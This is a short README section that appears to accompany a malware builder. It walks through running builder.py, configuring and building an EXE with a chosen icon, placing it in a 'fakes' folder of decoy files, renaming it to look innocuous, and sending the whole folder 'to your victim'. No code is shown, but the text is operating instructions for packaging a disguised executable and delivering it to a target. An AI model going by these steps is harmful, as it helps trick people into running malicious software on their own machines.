## ⁉️ How to build the EXE
Step 1: Make sure you have Python 3.9 or higher installed.

Step 2: Run start.bat to start builder.py

Step 3: Edit the configuration as much as you want.

Step 4: Select icon

Step 5: Start building by scrolling down(make sure your mouse is on the scrollbar or else you can't scroll.) and then clicking 'Build EXE'

Step 6: Wait for it

Step 7: You should have dist folder now and your exe should be there, then, get everything from the "fakes" Folder and put it in there.

## NOTICES:
notice how there is a 'fakes' folder? Yeah. That is where you put the exe from the `builder.py` in. Rename the exe file to whatever you want, I'd name it 'Builder', and after that, send the whole damn folder to your victim!
